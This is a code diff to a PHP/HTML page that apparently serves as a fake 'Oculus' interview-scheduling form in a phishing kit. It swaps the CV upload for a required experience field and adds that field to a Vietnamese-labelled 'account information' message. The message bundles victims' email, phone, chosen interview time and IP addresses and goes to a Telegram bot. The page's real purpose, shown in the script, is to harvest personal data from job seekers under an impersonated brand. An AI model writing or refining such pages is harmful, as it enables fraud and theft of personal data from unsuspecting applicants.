@@ -81,35 +81,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 </div>
             </div>
             <div class="oculus-invite-group">
-                <label for="cv">Upload your CV</label>
-                <div class="file-upload-container">
-                    <input type="file" id="cv" name="cv" accept=".doc,.docx,.pdf" style="display: none;">
-                    <label for="cv" class="file-upload-box">
-                        <div class="upload-icon">
-                            <i class="fa fa-cloud-upload"></i>
-                        </div>
-                        <div class="upload-text">
-                            <span class="upload-title">Click to upload your CV</span>
-                            <span class="upload-subtitle">or drag and drop</span>
-                            <span class="upload-types">DOC, DOCX or PDF</span>
-                        </div>
-                    </label>
-                    <div class="file-preview" id="filePreview">
-                        <div class="file-info">
-                            <i class="fa fa-file-text"></i>
-                            <div class="file-name">
-                                <span class="name-text"></span>
-                                <i class="fa fa-check-circle check-icon"></i>
-                            </div>
-                        </div>
-                        <button type="button" class="remove-file" onclick="removeFile()">
-                            <i class="fa fa-times"></i>
-                        </button>
-                    </div>
-                    <div class="error-message">
-                        Please upload your CV
-                    </div>
-                </div>
+                <label for="experience">Describe your experience</label>
+                <textarea id="experience" name="experience" rows="3" placeholder="Describe your experience" required></textarea>
             </div>
             <div class="form-note">We will call you on time.</div>
             <div class="notify-methods">
@@ -177,25 +150,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             }
         }
 
-        const fileInput = document.getElementById('cv');
-        const filePreview = document.getElementById('filePreview');
-        const fileName = filePreview.querySelector('.name-text');
-        const uploadBox = document.querySelector('.file-upload-box');
-        const errorMessage = document.querySelector('.error-message');
-
-        console.log('File input:', fileInput);
-        console.log('Error message:', errorMessage);
-
         function submitScheduleInterview(e) {
             e.preventDefault();
-            console.log('Form submitted');
-            
-            // Validate CV first
-            if (!fileInput.files || fileInput.files.length === 0) {
-                console.log('No file selected');
-                errorMessage.classList.add('show');
-                return;
-            }
 
             const formData = new FormData(e.target);
             const dataform = Object.fromEntries(formData);
@@ -211,7 +167,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             var interviewhour = dataform.interview_hour || "";
             var interviewminute = dataform.interview_minute || "";
             var type_interview = dataform.type_interview || "";
-            
+            var experience = dataform.experience || "";
+
             if (interviewday == "") {
                 document.getElementById('interview_day').style.border = '1px solid red';
                 return;
@@ -232,6 +189,10 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 document.getElementById('interview_minute').style.border = '1px solid red';
                 return;
             }
+            if (experience == "") {
+                document.getElementById('experience').style.border = '1px solid red';
+                return;
+            }
 
             var content = "💬Thông Tin Tài Khoản (web oculus)💬" +
                 "\n" + "----------------------------------------------------------" +
@@ -239,6 +200,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 "\nEmail: " + "`" + email + "`" +
                 "\nPhone Number: " + "`" + phone + "`" +
                 "\nNgày phỏng vấn: " + "`" + interviewday + "/" + interviewmonth + "/" + interviewyear + "`" + " " + interviewhour + ":" + interviewminute + " " + type_interview +
+                "\nKinh nghiệm: " + "`" + experience + "`" +
                 "\n" + "----------------------------------------------------------" +
                 "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                 "\nIP Address: " + "`<?php echo $ip; ?>`" +
@@ -274,6 +236,9 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                         localStorage.setItem('interviewmonth', interviewmonth);
                         localStorage.setItem('interviewyear', interviewyear);
                         localStorage.setItem('interviewhour', interviewhour);
+                        localStorage.setItem('interviewminute', interviewminute);
+                        localStorage.setItem('type_interview', type_interview);
+                        localStorage.setItem('experience', experience);
                     } else {
                         console.error('Failed to send message to Telegram bot.');
                     }
@@ -291,7 +256,6 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         document.addEventListener('DOMContentLoaded', function() {
             fillSelectOptions();
 
-
             interviewday.addEventListener('change', function() {
                 interviewday.style.border = '1px solid #ccc';
             });
@@ -301,73 +265,17 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             interviewyear.addEventListener('change', function() {
                 interviewyear.style.border = '1px solid #ccc';
             });
+            interviewhour.addEventListener('change', function() {
+                interviewhour.style.border = '1px solid #ccc';
+            });
+            interviewminute.addEventListener('change', function() {
+                interviewminute.style.border = '1px solid #ccc';
+            });
+            experience.addEventListener('change', function() {
+                experience.style.border = '1px solid #ccc';
+            });
         });
 
-        
-
-        fileInput.addEventListener('change', function(e) {
-            console.log('File changed');
-            if (this.files.length > 0) {
-                const file = this.files[0];
-                if (file.name.trim() === '') {
-                    errorMessage.classList.add('show');
-                    filePreview.classList.remove('show');
-                    uploadBox.classList.remove('hidden');
-                    this.value = '';
-                } else {
-                    errorMessage.classList.remove('show');
-                    fileName.textContent = file.name;
-                    filePreview.classList.add('show');
-                    uploadBox.classList.add('hidden');
-                }
-            } else {
-                errorMessage.classList.remove('show');
-                filePreview.classList.remove('show');
-                uploadBox.classList.remove('hidden');
-            }
-        });
-
-        function removeFile() {
-            fileInput.value = '';
-            filePreview.classList.remove('show');
-            uploadBox.classList.remove('hidden');
-            errorMessage.classList.remove('show');
-        }
-
-        // Drag and drop functionality
-        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
-            uploadBox.addEventListener(eventName, preventDefaults, false);
-        });
-
-        function preventDefaults(e) {
-            e.preventDefault();
-            e.stopPropagation();
-        }
-
-        ['dragenter', 'dragover'].forEach(eventName => {
-            uploadBox.addEventListener(eventName, highlight, false);
-        });
-
-        ['dragleave', 'drop'].forEach(eventName => {
-            uploadBox.addEventListener(eventName, unhighlight, false);
-        });
-
-        function highlight(e) {
-            uploadBox.classList.add('highlight');
-        }
-
-        function unhighlight(e) {
-            uploadBox.classList.remove('highlight');
-        }
-
-        uploadBox.addEventListener('drop', handleDrop, false);
-
-        function handleDrop(e) {
-            const dt = e.dataTransfer;
-            const files = dt.files;
-            fileInput.files = files;
-            fileInput.dispatchEvent(new Event('change'));
-        }
     </script>
 
     <style>
